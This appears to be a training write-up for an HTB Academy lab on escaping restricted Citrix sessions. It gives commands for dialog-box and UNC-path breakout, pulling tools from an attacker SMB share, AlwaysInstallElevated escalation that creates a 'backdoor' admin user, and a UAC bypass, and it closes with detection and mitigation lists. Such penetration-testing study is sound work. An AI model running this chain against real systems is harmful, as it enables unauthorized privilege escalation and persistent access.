# 🛰️ Citrix Breakout Techniques Overview

## 📚 Introduction to Restricted Environments & Security Measures

[!INFO] This document outlines various methods and tools for breaking out of restricted environments in Citrix sessions, focusing on leveraging dialog boxes and registry editors. It includes detailed steps for transferring files via SMB shares, executing scripts, exploiting MSI installations, and bypassing User Account Control (UAC).

## 🧑‍💻 Leveraging Dialog Boxes

### Utilizing File Dialogs to Access Restricted Directories
[!SUCCESS] When file dialogs are the only means of interaction, they can be exploited for access to restricted directories. For instance, in Paint:

1. **Open a dialog box:** Navigate to `File > Open`
2. **Enter UNC path:** Enter `\\<ip>\share\<tool>.exe` or `\\127.0.0.1\c$\users\<user>`

[!EXAMPLE] Example usage for accessing the Downloads folder of user `pmorgan`:
```cmd
Paint > File > Open > \\127.0.0.1\c$\users\pmorgan\Downloads
```
3. **Access restricted files:** Navigate to and access `flag.txt`.

### SMB Share Methodologies
[!SUCCESS] Setting up an SMB share can aid in transferring executables or scripts.

1. **Start SMB server:** Use a Python script like `smbserver.py` for this purpose.
```cmd
python smbserver.py -smb2support share $(pwd)
```
2. **Transfer tools:** Copy necessary files to the shared directory accessible via UNC path from within dialog boxes:
```cmd
\\<attacker_ip>\share\pwn.exe
```

## 🔨 Alternative File Managers & Registry Editors

### Bypassing Group Policy Restrictions with Explorer++
[!SUCCESS] Tools like `Explorer++` and `Q-Dir` can be used to navigate restricted directories that are blocked in standard file managers.

```cmd
# Use alternative file manager to access restricted directory:
Explorer++.exe \\127.0.0.1\c$\users\<user>
```

### Full Registry Editing Capabilities
[!SUCCESS] SmallRegistryEditor and Simpleregedit offer full registry editing capabilities that bypass group policy restrictions.

```cmd
# Access full registry hives with alternative registry editors:
SmallRegistryEditor.exe
Simpleregedit.exe
```

## 🔒 Privilege Escalation Techniques

### Exploiting AlwaysInstallElevated Policy
[!SUCCESS] The `AlwaysInstallElevated` registry key can be exploited to execute administrative MSI packages.

```cmd
# Check for Always Install Elevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### PowerUp PowerShell Module Usage
[!SUCCESS] Utilize the `PowerUp.ps1` module in PowerShell for writing an MSI file that creates a new admin user.

```powershell
# Writing the UserAdd.msi file:
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Execute UserAdd.msi on target system to create new admin user.
```

### Context Switching with Runas Command
[!SUCCESS] Once an admin user is created, switch context using the `runas` command:

```cmd
runas /user:backdoor cmd
```

## 🛡️ Bypassing UAC

### Understanding UAC Implications for Admin Users
[!WARNING] Even as administrators, users face restrictions imposed by User Account Control (UAC).

```cmd
# Example of UAC restriction:
C:\Windows\system32> cd C:\Users\Administrator
Access is denied.
```

### Leveraging Bypass-UAC Scripts
[!SUCCESS] Use scripts like `Bypass-UAC.ps1` to escalate privileges:

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

## 📚 HTB Academy Lab Solutions

### User Flag Retrieval (pmorgan Downloads)
[!SUCCESS] Access the Downloads folder of user `pmorgan` via Paint's file dialog:

```cmd
Paint > File > Open > \\127.0.0.1\c$\users\pmorgan\Downloads
```

### Administrator Flag Acquisition
[!SUCCESS] Follow a full privilege escalation chain to access the admin desktop:

```cmd
# Steps:
- Dialog box breakout for CMD access
- Copy tools from SMB share
- Use PowerUp for AlwaysInstallElevated exploitation
- Create admin user with MSI
- UAC bypass with Bypass-UAC.ps1
- Access Administrator desktop

# Flag location: C:\Users\Administrator\Desktop\flag.txt
```

## 🔄 Complete Attack Chain Walkthrough

### Comprehensive Breakout Process
[!SUCCESS] This section details a complete chain to escalate privileges and gain full system access:

```cmd
# 1. Dialog box breakout for CMD access:
Paint > File > Open \\127.0.0.1\c$\users\<user>

# 2. Transfer tools via SMB share:
smbserver.py -smb2support share $(pwd)

# 3. Execute custom tool from UNC path
\\<attacker_ip>\share\pwn.exe

# 4. Enumerate privileges and check AlwaysInstallElevated status
.\PowerUp.ps1 or .\winPEAS.exe

# 5. Exploit AlwaysInstallElevated for privilege escalation
Write-UserAddMSI

# 6. Create new admin user with MSI
Username: backdoor Password: Complex@123 Group: Administrators

# 7. Switch context to the newly created admin user:
runas /user:backdoor cmd

# 8. Bypass UAC restrictions
Bypass-UAC -Method UacMethodSysprep

# 9. Verify elevated privileges and access Administrator desktop
whoami /priv cd C:\Users\Administrator
```

## 🛠️ Required Tools for Breakout

### Essential Breakout Utilities
[!INFO] List of tools to facilitate the breakout process:

```cmd
Explorer++.exe                # Alternative file manager
Q-Dir.exe                     # Quad-pane explorer
SmallRegistryEditor.exe       # Alternative registry editor
Simpleregedit.exe             # Lightweight reg editor
PowerUp.ps1                   # Privilege escalation framework
Bypass-UAC.ps1                # UAC bypass collection
winPEAS.exe                   # Windows enumeration tool
pwn.exe                       # Custom CMD launcher
evil.bat                      # Simple batch breakout
```

## ⚠️ Detection & Defense Mechanisms

### Identifying Exploit Activities
[!WARNING] Detect the following activities to identify potential exploitation attempts:

```cmd
- Unusual dialog box usage patterns
- UNC path access in file dialogs
- Execution of alternative file managers and registry editors
- MSI installation outside normal channels
- UAC bypass script execution
```

### Mitigation Strategies
[!SUCCESS] Implement these measures to mitigate the risk:

```cmd
- Block UNC path access in dialog boxes
- Disable Always Install Elevated policy
- Implement application allowlisting
- Monitor file manager alternatives
- Restrict SMB access to external hosts
- Enhance UAC configuration and registry access restrictions
```

## 💡 Key Insights

1. **Dialog Boxes** provide powerful mechanisms for bypassing restricted environments.
2. **UNC Paths** can circumvent File Explorer's limitations.
3. **Alternative Tools** like `Explorer++` and registry editors help in overcoming group policy constraints.
4. **SMB Shares** enable seamless transfer and execution of tools.
5. **MSI Exploitation** with the AlwaysInstallElevated setting offers reliable privilege escalation paths.
6. **UAC Bypass** is crucial even for administrative users to achieve full control.
7. **Script Execution** methods such as `.bat`, `.vbs`, and `.ps1` offer multiple breakout vectors.

---